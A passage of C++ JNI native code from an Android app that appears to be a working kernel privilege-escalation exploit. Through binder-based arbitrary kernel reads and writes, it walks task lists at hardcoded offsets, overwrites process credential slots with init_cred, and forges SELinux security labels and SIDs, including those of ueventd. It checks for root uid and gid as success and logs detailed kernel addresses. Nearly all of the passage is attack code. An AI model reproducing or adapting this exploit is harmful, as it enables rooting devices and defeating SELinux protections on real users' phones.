                    final_donor_coherent = coherent ? 1 : 0;
                }
                previous_usage = coherent
                        ? final_donor_observed_usage : UINT32_MAX;
                final_donor_valid = final_donor_coherent >= 2;
                if (!final_donor_valid && attempt + 1 < 16) {
                    usleep(1000);
                }
            }
        }
    }
    bool pass = g_credential_target_external
            ? release_valid && (value_valid || validation_deferred) &&
                    direct_sequence_valid && collateral_valid &&
                    final_slots_valid && final_donor_valid
            : (victim == 1
                    ? geteuid() == 0 && getegid() == 0
                    : last_write && getuid() == 0 && getgid() == 0 &&
                            geteuid() == 0 && getegid() == 0);
    int gid_result = -1;
    int uid_result = -1;
    if (pass && g_direct_security_repair) {
        if (g_direct_terminal_cleanup && completion_terminal_label &&
            g_direct_write_step == 6) {
            g_terminal_donor_preexit_refs_valid = final_donor_valid &&
                    final_donor_observed_usage ==
                            g_security_target_baseline_usage + 2U;
            g_terminal_donor_preexit_usage =
                    final_donor_observed_usage;
        }
        ++g_direct_write_step;
        ++g_write_successes;
    }
    bool acknowledged = record_controlled_unlink(pass);
    pass = pass && acknowledged;
    char state[1664];
    std::snprintf(state, sizeof(state),
            "status=%s stage=null-write-complete victim=%d worker=%d"
            " target=0x%" PRIx64 " value=0x%" PRIx64
            " expected=0x%" PRIx64
            " read_back=%d value_valid=%d validation_deferred=%d external=%d"
            " target_effective=0x%" PRIx64
            " target_effective_read=%d"
            " direct_step=%d sequence_valid=%d"
            " collateral=0x%" PRIx64
            " collateral_read=%d collateral_valid=%d"
            " final_slots_valid=%d"
            " final_donor_valid=%d"
            " final_donor_attempts=%d"
            " final_donor_coherent=%d"
            " final_donor_live_valid=%d"
            " final_donor_live_stage=%d"
            " final_donor_live_after_valid=%d"
            " final_donor_live_after_stage=%d"
            " final_donor_snapshot_valid=%d"
            " final_donor_snapshot_stage=%d"
            " final_donor_repair_valid=%d"
            " final_donor_usage_valid=%d"
            " final_donor_expected_usage=%u-%u"
            " final_donor_observed_usage=%u"
            " final_donor_header=0x%" PRIx64
            " final_donor_final_header=0x%" PRIx64
            " final_donor_repair=0x%" PRIx64
            " final_donor_security=0x%" PRIx64
            " final_donor_sid=%u"
            " final_donor_zero_address=0x%" PRIx64
            " final_donor_zero_rc=%d"
            " final_donor_zero_errno=%d"
            " released=%d expected_release=%d poison=%d"
            " internal_write_misses=%d used_victims=%d"
            " successful_writes=%d"
            " setresuid=%d setresgid=%d normalise_deferred=%d"
            " uid=%u euid=%u gid=%u egid=%u",
            pass ? "pass" : "fail", victim, worker, address, value,
            expected_value, read_back ? 1 : 0, value_valid ? 1 : 0,
            validation_deferred ? 1 : 0,
            g_credential_target_external ? 1 : 0, target_effective,
            target_effective_read ? 1 : 0,
            g_direct_security_repair ? g_direct_write_step -
                    (pass ? 1 : 0) : 0,
            direct_sequence_valid ? 1 : 0, collateral,
            collateral_read ? 1 : 0, collateral_valid ? 1 : 0,
            final_slots_valid ? 1 : 0, final_donor_valid ? 1 : 0,
            final_donor_attempts, final_donor_coherent,
            final_donor_live_valid ? 1 : 0,
            final_donor_live_stage,
            final_donor_live_after_valid ? 1 : 0,
            final_donor_live_after_stage,
            final_donor_snapshot_valid ? 1 : 0,
            final_donor_snapshot_stage,
            final_donor_repair_valid ? 1 : 0,
            final_donor_usage_valid ? 1 : 0,
            final_donor_expected_usage_low,
            final_donor_expected_usage_high,
            final_donor_observed_usage,
            g_zero_snapshot_header,
            g_zero_snapshot_final_header,
            g_zero_snapshot_repair,
            g_zero_snapshot_security,
            g_zero_snapshot_sid,
            g_zero_read_address,
            g_zero_read_result,
            g_zero_read_errno,
            released, expected_before - 1, poisoned_control_count(),
            g_internal_write_misses, g_write_victims_used,
            g_write_successes,
            uid_result, gid_result, pass && last_write ? 1 : 0,
            static_cast<unsigned>(getuid()),
            static_cast<unsigned>(geteuid()),
            static_cast<unsigned>(getgid()),
            static_cast<unsigned>(getegid()));
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_vandam_prism_NativeBridge_arbitraryCredentialAddress(
        JNIEnv*, jclass) {
    return static_cast<jlong>(g_arb_cred_address);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_cacheCredentialTarget(
        JNIEnv* environment, jclass, jobject binder, jint pid,
        jint uid, jint gid) {
    int handle = discover_proxy_handle(environment, binder);
    bool pass = handle > 0 && pid > 0 && uid >= 0 && gid >= 0;
    if (pass) {
        g_credential_target_handle = handle;
        g_credential_target_pid = pid;
        g_credential_target_uid = static_cast<std::uint32_t>(uid);
        g_credential_target_gid = static_cast<std::uint32_t>(gid);
        g_credential_target_external = false;
    }
    char state[192];
    std::snprintf(state, sizeof(state),
            "status=%s stage=credential-target-cache handle=%d"
            " pid=%d uid=%d gid=%d",
            pass ? "pass" : "fail", handle, pid, uid, gid);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_cacheSecurityTarget(
        JNIEnv* environment, jclass, jobject binder, jint pid) {
    int handle = discover_proxy_handle(environment, binder);
    bool pass = handle > 0 && pid > 0;
    if (pass) {
        g_security_target_handle = handle;
        g_security_target_pid = pid;
        g_security_target_proc = 0;
        g_security_target_baseline_usage = 0;
        g_fake_security_sid = 0;
        g_security_target_cred_snapshot = false;
        g_security_target_slots_valid = false;
        g_security_target_real_cred_slot = 0;
        g_security_target_cred_slot = 0;
    }
    char state[160];
    std::snprintf(state, sizeof(state),
            "status=%s stage=security-target-cache handle=%d pid=%d",
            pass ? "pass" : "fail", handle, pid);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_cacheSecurityTargetPid(
        JNIEnv* environment, jclass, jint pid) {
    bool pass = pid > 0;
    if (pass) {
        g_security_target_handle = -1;
        g_security_target_pid = pid;
        g_security_target_proc = 0;
        g_security_target_baseline_usage = 0;
        g_fake_security_sid = 0;
        g_security_target_cred_snapshot = false;
        g_security_target_slots_valid = false;
        g_security_target_real_cred_slot = 0;
        g_security_target_cred_slot = 0;
    }
    char state[160];
    std::snprintf(state, sizeof(state),
            "status=%s stage=security-target-cache mode=pid pid=%d",
            pass ? "pass" : "fail", pid);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_adoptCredentialTarget(
        JNIEnv* environment, jclass) {
    reset_terminal_donor_proof();
    {
        std::lock_guard<std::mutex> lock(g_credential_target_death_mutex);
        g_credential_target_death_recorded = false;
        g_credential_target_death_proof.clear();
    }
    g_direct_init_target = false;
    g_direct_security_repair = false;
    g_direct_cred_quarantine = false;
    g_direct_terminal_cleanup = false;
    g_direct_write_step = 0;
    g_internal_write_misses = 0;
    g_write_victims_used = 0;
    g_write_successes = 0;
    g_null_write_armed = false;
    g_null_write_armed_victim = -1;
    g_terminal_cleanup_result.clear();
    g_direct_init_real_cred_slot = 0;
    g_direct_init_cred_slot = 0;
    g_direct_cred_value = 0;
    g_direct_quarantine_value = 0;
    g_private_cred = 0;
    std::fill(std::begin(g_private_cred_snapshot),
              std::end(g_private_cred_snapshot), 0);
    g_private_cred_sid = 0;
    g_final_shell_cred = 0;
    g_final_shell_cred_valid = false;
    g_terminal_donor_preexit_refs_valid = false;
    g_terminal_donor_preexit_usage = 0;
    g_terminal_ctlbuf_repair_verified = false;
    g_terminal_host_normalisation_gate = false;
    g_terminal_ctlbuf_profile_valid = false;
    g_terminal_helper_task = 0;
    g_terminal_memfd_inode_security_slot = 0;
    g_terminal_memfd_inode_security_original = 0;
    g_terminal_vendor_inode_security = 0;
    g_terminal_vendor_inode_security_word8 = 0;
    g_terminal_vendor_inode_sid = 0;
    g_terminal_ueventd_task = 0;
    g_terminal_ueventd_cred = 0;
    g_terminal_ueventd_security = 0;
    g_terminal_ueventd_security_word8 = 0;
    g_terminal_ueventd_sid = 0;
    g_terminal_owner_task = 0;
    g_terminal_owner_pid = -1;
    g_terminal_watched_fd = -1;
    g_terminal_arbitrary_fd = -1;
    g_terminal_reference_fd = -1;
    g_terminal_watched_file = 0;
    g_terminal_watched_inode = 0;
    g_terminal_watched_fops = 0;
    g_terminal_arbitrary_file = 0;
    g_terminal_arbitrary_inode = 0;
    g_terminal_arbitrary_fops = 0;
    g_terminal_reference_file = 0;
    g_terminal_reference_inode = 0;
    g_terminal_reference_fops = 0;
    g_terminal_selected_epitem = 0;
    g_terminal_expected_fops = 0;
    g_terminal_expected_ep_links = 0;
    g_terminal_donor_task = 0;
    g_terminal_donor_pid = -1;
    g_terminal_donor_real_cred_slot = 0;
    g_terminal_donor_cred_slot = 0;
    g_terminal_donor_usage = 0;
    std::fill(std::begin(g_terminal_donor_ids),
              std::end(g_terminal_donor_ids), 0);
    g_terminal_donor_caps = 0;
    g_terminal_donor_sid = 0;
    g_terminal_donor_security = 0;
    g_terminal_module_memfd = -1;
    g_terminal_vendor_fd = -1;
    g_terminal_ueventd_pid = -1;
    std::uint64_t original_cred = g_arb_cred_address;
    std::uint64_t current_proc = g_cached_current_binder_proc;
    std::uint64_t target_proc = find_target_binder_proc(
            current_proc, g_credential_target_handle);
    std::uint32_t target_pid = 0;
    std::uint64_t target_task = 0;
    bool procs = kernel_pointer(current_proc) &&
            kernel_pointer(target_proc) &&
            arbitrary_read32(target_proc + 64, &target_pid) &&
            target_pid == static_cast<std::uint32_t>(
                    g_credential_target_pid) &&
            reliable_read64(target_proc + 72, &target_task) &&
            kernel_pointer(target_task);

    constexpr std::uint64_t kTaskRealCredOffset = 0x778;
    constexpr std::uint64_t kTaskCredOffset = 0x780;
    std::uint64_t target_real_cred = 0;
    std::uint64_t target_cred = 0;
    bool task_creds = procs && reliable_read64(
                    target_task + kTaskRealCredOffset,
                    &target_real_cred) &&
            reliable_read64(target_task + kTaskCredOffset, &target_cred) &&
            target_real_cred == target_cred && kernel_pointer(target_cred);

    std::uint64_t expected_ids = g_credential_target_uid |
            (static_cast<std::uint64_t>(g_credential_target_gid) << 32U);
    std::uint64_t id_pairs[4] {};
    bool ids_valid = task_creds;
    for (int index = 0; ids_valid && index < 4; ++index) {
        ids_valid = arbitrary_read64(target_cred + 4 + index * 8,
                                     &id_pairs[index]) &&
                id_pairs[index] == expected_ids;
    }
    std::uint64_t first_snapshot[kCredentialSnapshotWords] {};
    std::uint64_t second_snapshot[kCredentialSnapshotWords] {};
    std::uint32_t first_sid = 0;
    std::uint32_t second_sid = 0;
    std::uint64_t expected_user_ns = 0;
    bool user_ns_valid = kernel_address(g_profile_init_cred) &&
            reliable_read64(
                    g_profile_init_cred + 17 * sizeof(std::uint64_t),
                    &expected_user_ns) &&
            kernel_address(expected_user_ns);
    bool first_snapshot_read = ids_valid && user_ns_valid &&
            read_credential_snapshot(
                    target_cred, target_task + kTaskCredOffset,
                    first_snapshot, &first_sid);
    bool second_snapshot_read = first_snapshot_read &&
            read_credential_snapshot(
                    target_cred, target_task + kTaskCredOffset,
                    second_snapshot, &second_sid);
    bool snapshots_equal = second_snapshot_read &&
            std::equal(std::begin(first_snapshot),
                       std::end(first_snapshot),
                       std::begin(second_snapshot));
    bool sids_equal = snapshots_equal && first_sid == second_sid;
    bool shell_snapshot_valid = sids_equal &&
            shell_credential_snapshot_valid(
                    second_snapshot, second_sid, expected_user_ns);
    bool stable_private = shell_snapshot_valid;
    bool identity_valid = procs && ids_valid && stable_private;
    std::uint64_t target_security = 0;
    std::uint32_t security_words[16] {};
    bool security_pointer_read = identity_valid && arbitrary_read64(
            target_cred + kCredSecurityOffset, &target_security) &&
            kernel_pointer(target_security) &&
            target_security == second_snapshot[15];
    bool security_read = security_pointer_read;
    for (int index = 0; security_read && index < 16; ++index) {
        security_read = arbitrary_read32(
                target_security + index * sizeof(std::uint32_t),
                &security_words[index]);
    }
    bool pass = identity_valid && security_pointer_read;
    if (pass) {
        g_arb_cred_address = target_cred;
        g_credential_target_external = true;
        g_cached_current_binder_proc = current_proc;
        g_credential_target_task = target_task;
        g_credential_target_security = target_security;
        g_private_cred = target_cred;
        std::copy(std::begin(second_snapshot), std::end(second_snapshot),
                  std::begin(g_private_cred_snapshot));
        g_private_cred_sid = second_sid;
    }
    char state[2048];
    std::snprintf(state, sizeof(state),
            "status=%s stage=credential-target-adopt handle=%d"
            " pid=%u expected_pid=%d current_proc=0x%" PRIx64
            " target_proc=0x%" PRIx64
            " target_task=0x%" PRIx64
            " original_cred=0x%" PRIx64
            " target_real_cred=0x%" PRIx64
            " target_cred=0x%" PRIx64
            " task_slots_direct=%d ids_valid=%d stable_private=%d"
            " first_snapshot=%d second_snapshot=%d snapshots_equal=%d"
            " sids_equal=%d shell_snapshot=%d first_sid=%u second_sid=%u"
            " private_usage=%u security=0x%" PRIx64
            " user_ns=0x%" PRIx64 " expected_user_ns=0x%" PRIx64
            " securebits=%u cap_inh=0x%" PRIx64
            " cap_prm=0x%" PRIx64 " cap_eff=0x%" PRIx64
            " cap_bnd=0x%" PRIx64 " cap_amb=0x%" PRIx64
            " security_ptr=0x%" PRIx64 " user_ptr=0x%" PRIx64
            " group_info=0x%" PRIx64
            " security_read=%d ref_nodes=%d"
            " probe_stage=%d probe_errno=%d"
            " probe_anchor=0x%" PRIx64
            " probe_fops=0x%" PRIx64
            " probe_base=0x%" PRIx64
            " probe_init=0x%" PRIx64
            " probe_header=0x%" PRIx64
            " probe_ids=%" PRIx64 ",%" PRIx64 ",%" PRIx64 ",%" PRIx64
            " probe_caps=0x%" PRIx64
            " probe_security=0x%" PRIx64
            " probe_sid=%u"
            " profile_slide=0x%" PRIx64
            " profile_init_cred=0x%" PRIx64
            " security_words=%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,"
            "%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x",
            pass ? "pass" : "fail", g_credential_target_handle,
            target_pid, g_credential_target_pid, current_proc, target_proc,
            target_task, original_cred, target_real_cred,
            target_cred, task_creds ? 1 : 0, ids_valid ? 1 : 0,
            stable_private ? 1 : 0,
            first_snapshot_read ? 1 : 0,
            second_snapshot_read ? 1 : 0,
            snapshots_equal ? 1 : 0, sids_equal ? 1 : 0,
            shell_snapshot_valid ? 1 : 0, first_sid, second_sid,
            static_cast<std::uint32_t>(second_snapshot[0]), target_security,
            second_snapshot[17], expected_user_ns,
            static_cast<std::uint32_t>(second_snapshot[4] >> 32U),
            second_snapshot[5], second_snapshot[6], second_snapshot[7],
            second_snapshot[8], second_snapshot[9], second_snapshot[15],
            second_snapshot[16], second_snapshot[18],
            security_read ? 1 : 0, g_last_binder_ref_nodes,
            g_last_binder_probe_stage,
            g_last_binder_probe_errno,
            g_last_binder_probe_file, g_last_binder_probe_fops,
            g_last_binder_probe_base, g_last_binder_probe_init_cred,
            g_last_binder_probe_init_header,
            g_last_binder_probe_init_ids[0],
            g_last_binder_probe_init_ids[1],
            g_last_binder_probe_init_ids[2],
            g_last_binder_probe_init_ids[3],
            g_last_binder_probe_init_caps,
            g_last_binder_probe_init_security,
            g_last_binder_probe_init_sid, g_profile_kernel_slide,
            g_profile_init_cred,
            security_words[0], security_words[1], security_words[2],
            security_words[3], security_words[4], security_words[5],
            security_words[6], security_words[7], security_words[8],
            security_words[9], security_words[10], security_words[11],
            security_words[12], security_words[13], security_words[14],
            security_words[15]);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_prepareDirectInitTarget(
        JNIEnv* environment, jclass) {
    std::uint64_t real_cred_slot = 0;
    std::uint64_t cred_slot = 0;
    bool slots = find_cred_slots(
            g_credential_target_task, g_arb_cred_address,
            &real_cred_slot, &cred_slot);
    std::uint64_t kernel_base = kKernelLinkBase + g_profile_kernel_slide;
    std::uint64_t init_cred = g_profile_init_cred;
    bool image_profile = kernel_address(kernel_base) &&
            (kernel_base & (kKaslrAlignment - 1)) == 0 &&
            g_last_binder_probe_base == kernel_base &&
            g_last_binder_probe_fops == kernel_base + kEventfdFopsOffset &&
            init_cred == kernel_base + kInitCredOffset &&
            init_cred == g_last_binder_probe_init_cred;
    bool pass = slots && image_profile &&
            cred_slot == real_cred_slot + 8;
    if (pass) {
        g_direct_init_target = true;
        g_direct_security_repair = false;
        g_direct_write_step = 0;
        g_direct_init_real_cred_slot = real_cred_slot;
        g_direct_init_cred_slot = cred_slot;
        g_direct_cred_value = init_cred;
    }
    char state[640];
    std::snprintf(state, sizeof(state),
            "status=%s stage=direct-init-target"
            " task=0x%" PRIx64
            " current_cred=0x%" PRIx64
            " real_cred_slot=0x%" PRIx64
            " cred_slot=0x%" PRIx64
            " kernel_base=0x%" PRIx64
            " init_cred=0x%" PRIx64
            " eventfd_fops=0x%" PRIx64
            " init_header=0x%" PRIx64
            " init_security=0x%" PRIx64
            " init_sid=%u init_caps=0x%" PRIx64,
            pass ? "pass" : "fail", g_credential_target_task,
            g_arb_cred_address, real_cred_slot, cred_slot,
            kernel_base, init_cred, g_last_binder_probe_fops,
            g_last_binder_probe_init_header,
            g_last_binder_probe_init_security,
            g_last_binder_probe_init_sid,
            g_last_binder_probe_init_caps);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_adoptSecurityTarget(
        JNIEnv* environment, jclass) {
    std::uint64_t target_proc = g_security_target_handle > 0
            ? find_target_binder_proc(
                    g_cached_current_binder_proc,
                    g_security_target_handle)
            : find_security_target_binder_proc();
    std::uint64_t repeated_target_proc = g_security_target_handle > 0
            ? target_proc : find_security_target_binder_proc();
    std::uint32_t target_pid = 0;
    std::uint64_t target_cred = 0;
    std::uint64_t target_real_cred = 0;
    std::uint64_t target_task = 0;
    std::uint64_t security = 0;
    std::uint32_t osid = 0;
    std::uint32_t sid = 0;
    bool pass = kernel_pointer(g_cached_current_binder_proc) &&
            kernel_pointer(target_proc) &&
            target_proc == repeated_target_proc &&
            arbitrary_read32(target_proc + 64, &target_pid) &&
            target_pid == static_cast<std::uint32_t>(g_security_target_pid) &&
            reliable_read64(target_proc + 72, &target_task) &&
            kernel_pointer(target_task) &&
            reliable_read64(target_task + 0x778, &target_real_cred) &&
            reliable_read64(target_task + 0x780, &target_cred) &&
            target_real_cred == target_cred &&
            kernel_pointer(target_cred) &&
            arbitrary_read64(target_cred + kCredSecurityOffset, &security) &&
            kernel_pointer(security) &&
            arbitrary_read32(security, &osid) &&
            arbitrary_read32(security + 4, &sid) && sid != 0;
    std::uint64_t cred_header = 0;
    std::uint64_t cred_ids[4] {};
    std::uint64_t cred_caps = 0;
    std::uint64_t cred_repair = UINT64_MAX;
    bool header_read = pass && reliable_read64(target_cred, &cred_header);
    bool ids_valid = header_read;
    for (int index = 0; index < 4; ++index) {
        if (!ids_valid || !reliable_read64(
                target_cred + 4 + index * 8, &cred_ids[index])) {
            ids_valid = false;
        }
    }
    bool caps_read = header_read && reliable_read64(
            target_cred + 56, &cred_caps);
    bool repair_read = header_read && reliable_read64(
            target_cred + 8, &cred_repair);
    std::uint64_t real_cred_slot = 0;
    std::uint64_t cred_slot = 0;
    bool slots = pass && find_cred_slots(
            target_task, target_cred, &real_cred_slot, &cred_slot);
    if (g_security_target_handle <= 0) {
        slots = slots && real_cred_slot == target_task + 0x778 &&
                cred_slot == target_task + 0x780;
        pass = pass && slots;
    }
    if (pass) {
        g_security_target_proc = target_proc;
        g_fake_security_sid = sid;
        g_security_target_blob = security;
        g_security_target_task = target_task;
        g_security_target_cred = target_cred;
        g_security_target_real_cred_slot = real_cred_slot;
        g_security_target_cred_slot = cred_slot;
        g_security_target_cred_header = cred_header;
        std::copy(std::begin(cred_ids), std::end(cred_ids),
                  std::begin(g_security_target_cred_ids));
        g_security_target_cred_caps = cred_caps;
        g_security_target_cred_repair = cred_repair;
        g_security_target_cred_snapshot = header_read && ids_valid &&
                caps_read && repair_read && slots;
        g_security_target_slots_valid = slots;
    }
    char state[640];
    std::snprintf(state, sizeof(state),
            "status=%s stage=security-target-adopt handle=%d"
            " pid=%u expected_pid=%d proc=0x%" PRIx64
            " task=0x%" PRIx64
            " real_cred=0x%" PRIx64
            " cred=0x%" PRIx64 " task_slots_direct=1"
            " security=0x%" PRIx64
            " osid=%u sid=%u"
            " header=0x%" PRIx64 " ids_valid=%d caps=0x%" PRIx64
            " repair=0x%" PRIx64 " reads=%d,%d,%d,%d slots=%d",
            pass ? "pass" : "fail", g_security_target_handle,
            target_pid, g_security_target_pid, target_proc,
            target_task, target_real_cred, target_cred, security, osid, sid,
            cred_header, ids_valid ? 1 : 0, cred_caps, cred_repair,
            header_read ? 1 : 0, ids_valid ? 1 : 0,
            caps_read ? 1 : 0, repair_read ? 1 : 0, slots ? 1 : 0);
    return environment->NewStringUTF(state);
}

bool read_task_name(std::uint64_t task, char name[17]) {
    if (!kernel_pointer(task) || name == nullptr ||
        !kernel_pointer(g_security_target_cred_slot) ||
        !kernel_pointer(g_security_target_cred)) {
        return false;
    }
    std::memset(name, 0, 17);
    for (int index = 0; index < 2; ++index) {
        std::uint64_t word = 0;
        if (!reliable_read64_allow_zero(
                    task + kTaskCommOffset +
                            static_cast<std::uint64_t>(index * 8),
                    g_security_target_cred_slot, g_security_target_cred,
                    &word)) {
            return false;
        }
        std::memcpy(name + index * 8, &word, sizeof(word));
    }
    name[16] = '\0';
    return std::memchr(name, '\0', 16) != nullptr;
}

bool find_task_by_pid_exact(int pid, std::uint64_t* result) {
    if (pid <= 0 || result == nullptr || g_profile_kernel_slide == 0) {
        return false;
    }
    std::uint64_t kernel_base = kKernelLinkBase + g_profile_kernel_slide;
    std::uint64_t init_task = kernel_base + kInitTaskOffset;
    std::uint64_t head = init_task + kTaskTasksOffset;
    std::uint64_t cursor = 0;
    if (!kernel_address(init_task) || !reliable_read64(head, &cursor) ||
        !kernel_address(cursor)) {
        return false;
    }
    std::set<std::uint64_t> visited;
    for (int count = 0; count < 32768 && cursor != head; ++count) {
        if (!kernel_address(cursor) || cursor < kTaskTasksOffset ||
            !visited.insert(cursor).second) {
            return false;
        }
        std::uint64_t task = cursor - kTaskTasksOffset;
        std::uint32_t task_pid = 0;
        std::uint32_t task_tgid = 0;
        std::uint64_t next = 0;
        if (!kernel_pointer(task) ||
            !reliable_read32(task + kTaskPidOffset, &task_pid) ||
            !reliable_read32(task + kTaskTgidOffset, &task_tgid) ||
            !reliable_read64(cursor, &next) ||
            !kernel_address(next)) {
            return false;
        }
        if (task_pid == static_cast<std::uint32_t>(pid)) {
            if (task_tgid != task_pid) {
                return false;
            }
            *result = task;
            return true;
        }
        cursor = next;
    }
    return false;
}

bool lookup_task_fd(std::uint64_t task, int descriptor,
                    std::uint64_t* file, std::uint64_t* inode,
                    std::uint64_t* inode_security_slot,
                    std::uint64_t* file_security) {
    if (!kernel_pointer(task) || descriptor < 0 || file == nullptr ||
        inode == nullptr || inode_security_slot == nullptr ||
        file_security == nullptr) {
        return false;
    }
    std::uint64_t files = 0;
    std::uint64_t fdt = 0;
    std::uint64_t fd_array = 0;
    std::uint64_t object = 0;
    std::uint64_t object_inode = 0;
    std::uint64_t object_security = 0;
    if (!reliable_read64(task + kTaskFilesOffset, &files) ||
        !kernel_pointer(files) ||
        !reliable_read64(files + kFilesFdtOffset, &fdt) ||
        !kernel_pointer(fdt) ||
        !reliable_read64(fdt + kFdtableFdOffset, &fd_array) ||
        !kernel_pointer(fd_array) ||
        !reliable_read64(
                fd_array + static_cast<std::uint64_t>(descriptor) * 8,
                &object) ||
        !kernel_pointer(object) ||
        !reliable_read64(object + kFileInodeOffset, &object_inode) ||
        !kernel_pointer(object_inode) ||
        !reliable_read64(object + kFileSecurityOffset, &object_security) ||
        !kernel_pointer(object_security)) {
        return false;
    }
    *file = object;
    *inode = object_inode;
    *inode_security_slot = object_inode + kInodeSecurityOffset;
    *file_security = object_security;
    return true;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_profileCtlbufRescue(
        JNIEnv* environment, jclass, jint module_memfd, jint vendor_fd,
        jint ueventd_pid) {
    g_terminal_ctlbuf_profile_valid = false;
    if (!g_direct_terminal_cleanup || !g_direct_security_repair ||
        g_direct_write_step != 1 || g_private_cred == 0 ||
        module_memfd < 0 || vendor_fd < 0 || ueventd_pid <= 0) {
        return environment->NewStringUTF(
                "status=fail stage=ctlbuf-rescue-profile reason=state");
    }
    std::uint64_t app_task = 0;
    std::uint32_t app_pid = 0;
    bool app = kernel_pointer(g_cached_current_binder_proc) &&
            reliable_read64(g_cached_current_binder_proc + 72, &app_task) &&
            kernel_pointer(app_task) &&
            reliable_read32(app_task + kTaskPidOffset, &app_pid) &&
            app_pid == static_cast<std::uint32_t>(getpid());
    std::uint64_t module_file = 0;
    std::uint64_t module_inode = 0;
    std::uint64_t module_inode_slot = 0;
    std::uint64_t module_file_security = 0;
    std::uint64_t vendor_file = 0;
    std::uint64_t vendor_inode = 0;
    std::uint64_t vendor_inode_slot = 0;
    std::uint64_t vendor_file_security = 0;
    bool files = app && lookup_task_fd(
                    app_task, module_memfd, &module_file, &module_inode,
                    &module_inode_slot, &module_file_security) &&
            lookup_task_fd(
                    app_task, vendor_fd, &vendor_file, &vendor_inode,
                    &vendor_inode_slot, &vendor_file_security) &&
            module_file != vendor_file && module_inode != vendor_inode;
    std::uint64_t module_inode_security = 0;
    std::uint64_t vendor_inode_security = 0;
    std::uint64_t vendor_word8 = 0;
    std::uint32_t cred_blob_offset = UINT32_MAX;
    std::uint32_t file_blob_offset = UINT32_MAX;
    std::uint32_t inode_blob_offset = UINT32_MAX;
    std::uint64_t blob_offsets_cred_file = 0;
    std::uint64_t blob_offsets_inode_ipc = 0;
    std::uint32_t vendor_sid = 0;
    std::uint32_t module_file_sid = 0;
    std::uint32_t vendor_file_isid = 0;
    std::uint64_t vendor_inode_sid_pair = 0;
    std::uint64_t module_file_sid_pair = 0;
    std::uint64_t vendor_file_isid_pair = 0;
    std::uint64_t kernel_base = kKernelLinkBase + g_profile_kernel_slide;
    std::uint64_t blob_sizes = kernel_base + kSelinuxBlobSizesOffset;
    bool blob_offsets = files && kernel_address(blob_sizes) &&
            reliable_read64_allow_zero(
                    blob_sizes, g_security_target_cred_slot,
                    g_security_target_cred,
                    &blob_offsets_cred_file) &&
            reliable_read64_allow_zero(
                    blob_sizes + 8, g_security_target_cred_slot,
                    g_security_target_cred,
                    &blob_offsets_inode_ipc);
    if (blob_offsets) {
        cred_blob_offset = static_cast<std::uint32_t>(
                blob_offsets_cred_file);
        file_blob_offset = static_cast<std::uint32_t>(
                blob_offsets_cred_file >> 32U);
        inode_blob_offset = static_cast<std::uint32_t>(
                blob_offsets_inode_ipc);
    }
    blob_offsets = blob_offsets &&
            cred_blob_offset == 0 && file_blob_offset < 4096 &&
            (file_blob_offset & 3U) == 0 &&
            inode_blob_offset == sizeof(std::uint64_t) * 2;
    bool labels = blob_offsets &&
            reliable_read64(module_inode_slot, &module_inode_security) &&
            kernel_pointer(module_inode_security) &&
            reliable_read64(vendor_inode_slot, &vendor_inode_security) &&
            kernel_pointer(vendor_inode_security) &&
            reliable_read64_allow_zero(
                    vendor_inode_security + 8,
                    g_security_target_cred_slot, g_security_target_cred,
                    &vendor_word8) &&
            reliable_read64_allow_zero(
                    vendor_inode_security + inode_blob_offset + 24,
                    g_security_target_cred_slot, g_security_target_cred,
                    &vendor_inode_sid_pair) &&
            (vendor_sid = static_cast<std::uint32_t>(
                    vendor_inode_sid_pair >> 32U)) != 0 &&
            reliable_read64_allow_zero(
                    module_file_security + file_blob_offset,
                    g_security_target_cred_slot, g_security_target_cred,
                    &module_file_sid_pair) &&
            (module_file_sid = static_cast<std::uint32_t>(
                    module_file_sid_pair)) != 0 &&
            reliable_read64_allow_zero(
                    vendor_file_security + file_blob_offset + 8,
                    g_security_target_cred_slot, g_security_target_cred,
                    &vendor_file_isid_pair) &&
            (vendor_file_isid = static_cast<std::uint32_t>(
                    vendor_file_isid_pair)) != 0 &&
            vendor_file_isid == vendor_sid;
    std::uint64_t ueventd_task = 0;
    std::uint64_t ueventd_real_cred = 0;
    std::uint64_t ueventd_cred = 0;
    std::uint64_t ueventd_security = 0;
    std::uint64_t ueventd_word8 = 0;
    std::uint32_t ueventd_sid = 0;
    std::uint64_t ueventd_sid_pair = 0;
    char ueventd_name[17] {};
    bool ueventd = labels && find_task_by_pid_exact(
                    ueventd_pid, &ueventd_task) &&
            read_task_name(ueventd_task, ueventd_name) &&
            std::strcmp(ueventd_name, "ueventd") == 0 &&
            reliable_read64(
                    ueventd_task + 0x778, &ueventd_real_cred) &&
            reliable_read64(ueventd_task + 0x780, &ueventd_cred) &&
            ueventd_real_cred == ueventd_cred &&
            kernel_pointer(ueventd_cred) &&
            reliable_read64(
                    ueventd_cred + kCredSecurityOffset,
                    &ueventd_security) &&
            kernel_pointer(ueventd_security) &&
            reliable_read64_allow_zero(
                    ueventd_security + 8,
                    g_security_target_cred_slot, g_security_target_cred,
                    &ueventd_word8) &&
            reliable_read64_allow_zero(
                    ueventd_security + cred_blob_offset,
                    g_security_target_cred_slot, g_security_target_cred,
                    &ueventd_sid_pair) &&
            (ueventd_sid = static_cast<std::uint32_t>(
                    ueventd_sid_pair >> 32U)) != 0;
    std::uint64_t helper_task = g_direct_init_real_cred_slot - 0x778;
    bool pointers = ueventd && kernel_pointer(helper_task) &&
            helper_task == g_credential_target_task &&
            module_inode_security != vendor_inode_security &&
            vendor_inode_security != ueventd_security &&
            module_inode_security != ueventd_security &&
            g_security_target_blob != ueventd_security &&
            module_inode_slot != g_security_target_cred +
                    kCredSecurityOffset;
    int watched_fd = g_selected_epoll_watched_fd;
    int arbitrary_fd = g_arb_file_fd;
    int reference_fd = -1;
    std::uint32_t expected_ep_links = 0;
    {
